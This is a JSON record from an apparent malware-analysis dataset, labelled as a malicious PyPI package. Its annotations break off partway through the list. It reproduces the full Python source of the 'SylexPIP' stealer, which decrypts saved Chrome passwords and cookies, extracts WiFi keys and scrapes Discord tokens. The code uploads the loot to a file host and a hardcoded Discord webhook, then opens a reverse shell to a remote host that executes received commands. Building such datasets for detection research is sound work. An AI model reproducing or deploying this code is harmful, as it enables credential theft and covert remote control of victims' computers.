{
  "metadata": {
    "package_name": "pyclonefile-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/pyclonefile-1.0.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__main__.py",
      "code_snippets": [
        {
          "snippet": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport subprocess as sp\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1085607111062454374/bnEvq061GcWHDip-IEF1IJwvOjmVQXhWJMQeFhGK95Edy5QLx1FPkXbDpnB97tebw566\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n    REVSHELL  = True # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"testing35123.duckdns.org\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 4444 # server port to connect to\n\nclass EVIL:\n    \"\"\" SylexPIP Malware \"\"\"\n\n    class LOGGER:\n        \"\"\" Discord/System grabbing \"\"\"\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': platform.system(), 'Release': platform.release(),\n            'Version': platform.version(), 'Arch': platform.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            \"\"\" Write wifi passwords to file and upload \"\"\"\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n                \n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"latin-1\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n\n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"latin-1\", errors=\"strict\")        \n                        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        \n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n\n                return self.passwords\n\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n\n        class GetChromePasswords:\n            \"\"\" Decrypt all saved chrome passwords and upload file \"\"\"\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='latin-1', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n\n        class GetChromeCookies:\n            \"\"\" Get Chrome Cookies - Current error: can't decrypt cookies \"\"\"\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"latin-1\") as f: local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"latin-1\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n\n        class DiscordTokens:\n            \"\"\" Scrape local & browser Discord tokens \"\"\"\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    \"Discord\"               : ROAMING + \"\\\\Discord\",\n                    \"Discord Canary\"        : ROAMING + \"\\\\discordcanary\",\n                    \"Discord PTB\"           : ROAMING + \"\\\\discordptb\",\n                    \"Google Chrome\"         : LOCAL + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n                    \"Opera\"                 : ROAMING + \"\\\\Opera Software\\\\Opera Stable\",\n                    \"Brave\"                 : LOCAL + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n                    \"Yandex\"                : LOCAL + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n                    'Lightcord'             : ROAMING + \"\\\\Lightcord\",\n                    'Opera GX'              : ROAMING + \"\\\\Opera Software\\\\Opera GX Stable\",\n                    'Amigo'                 : LOCAL + \"\\\\Amigo\\\\User Data\",\n                    'Torch'                 : LOCAL + \"\\\\Torch\\\\User Data\",\n                    'Kometa'                : LOCAL + \"\\\\Kometa\\\\User Data\",\n                    'Orbitum'               : LOCAL + \"\\\\Orbitum\\\\User Data\",\n                    'CentBrowser'           : LOCAL + \"\\\\CentBrowser\\\\User Data\",\n                    '7Star'                 : LOCAL + \"\\\\7Star\\\\7Star\\\\User Data\",\n                    'Sputnik'               : LOCAL + \"\\\\Sputnik\\\\Sputnik\\\\User Data\",\n                    'Vivaldi'               : LOCAL + \"\\\\Vivaldi\\\\User Data\\\\Default\",\n                    'Chrome SxS'            : LOCAL + \"\\\\Google\\\\Chrome SxS\\\\User Data\",\n                    'Epic Privacy Browser'  : LOCAL + \"\\\\Epic Privacy Browser\\\\User Data\",\n                    'Microsoft Edge'        : LOCAL + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\",\n                    'Uran'                  : LOCAL + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\",\n                    'Iridium'               : LOCAL + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveld\",\n                    'Firefox'               : ROAMING + \"\\\\Mozilla\\\\Firefox\\\\Profiles\",\n                }\n                \n                for platform, path in PATHS.items():\n                    path = os.path.join(path, \"Local Storage\", \"leveldb\")\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(os.path.join(path, file_name), errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" -> \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n\n            def Valid(self, token):\n                \"\"\" Currently not used \"\"\"\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n\n        def Main(self):\n            \"\"\" Get information and construct embed \"\"\"\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{platform.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"SylexPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/sylexpip\"\n                        },\n                    }\n\n            heading = {\n                \"content\": f\"**SylexPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"SylexPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n\n    class NETWORK:\n        \"\"\" RAT/Reverse Shell (Isn't very good ATM)\"\"\"\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n\n        def Persistence(self):\n            return None\n\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"SylexPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/sylexpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"SylexPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n        def Main(self):\n            \"\"\" currently working on the localtunnel function and getting the tunnel link automatically... \"\"\"\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "platform.release()",
              "action_description": "Retrieves operating system release version",
              "action_id": "get_os_release",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "platform.version()",
              "action_description": "Retrieves operating system version",
              "action_id": "get_os_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "platform.machine()",
              "action_description": "Retrieves machine type",
              "action_id": "get_machine_type",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "socket.gethostname()",
              "object_description": "System hostname",
              "object_id": "system_hostname",
              "intention_description": "Collect IP address",
              "intention_id": "collect_ip_address"
            },
            {
              "action_api": "get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://icanhazip.com",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'..', '%012x' % getnode()",
              "object_description": "Character code array",
              "object_id": "character_code_array",
              "intention_description": "Extract MAC address",
              "intention_id": "extract_mac_address"
            },
            {
              "action_api": "choice()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "string.ascii_letters",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(self.errors)",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "server, files=file",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "sp.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL",
              "object_description": "Network command string (e.g., ipconfig, netstat)",
              "object_id": "network_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "networks.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "encoding='latin-1', errors='strict'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Profile\\s*:\\s)(.*), networks",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_wifi_profile_names",
              "intention_id": "extract_wifi_profile_names"
            },
            {
              "action_api": "sp.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL",
              "object_description": "Network command string (e.g., ipconfig, netstat)",
              "object_id": "network_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "current_result.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "encoding='latin-1', errors='strict'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:SSID name\\s*:\\s)(.*), str(current_result)",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_wifi_ssid",
              "intention_id": "extract_wifi_ssid"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'(?:Authentication\\s*:\\s)(.*)', current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_authentication_type",
              "intention_id": "extract_authentication_type"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Cipher\\s*:\\s)(.*), current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_cipher_type",
              "intention_id": "extract_cipher_type"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'(?:Security key\\s*:\\s)(.*)', current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_security_key_presence",
              "intention_id": "extract_security_key_presence"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "(?:Key Content\\s*:\\s)(.*), current_result",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_wifi_password",
              "intention_id": "extract_wifi_password"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(self.Passwords())",
              "object_description": "Password string",
              "object_id": "password_string",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "LOGGER.UploadFile()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "randomfilename, filename='WiFi Passwords'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.APP_DATA_PATH, self.DB_PATH",
              "object_description": "Browser data directory and file name",
              "object_id": "browser_data_directory_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "_full_path, _temp_path",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "db_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "'select signon_realm,username_value,password_value from logins'",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "self.ChromeDecrypt()",
              "action_description": "Decrypt browser stored credentials",
              "action_id": "decrypt_browser_credentials",
              "object": "row[2]",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "db_file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "encoded_key.encode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode encrypted key",
              "intention_id": "decode_encrypted_key"
            },
            {
              "action_api": "self.DecryptDPAPI()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "encrypted_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "Cipher()",
              "action_description": "Creates new cipher object",
              "action_id": "get_crypto_backend",
              "object": "algorithms.AES(key), None, backend=default_backend()",
              "object_description": "Encryption key",
              "object_id": "encryption_key",
              "intention_description": "Decrypt encrypted data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "self.Decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "cipher, encrypted_txt[15:], nonce",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(self.passwordlog)",
              "object_description": "Password string",
              "object_id": "password_string",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "LOGGER.UploadFile()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "randomfilename, filename='Chrome Passwords'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
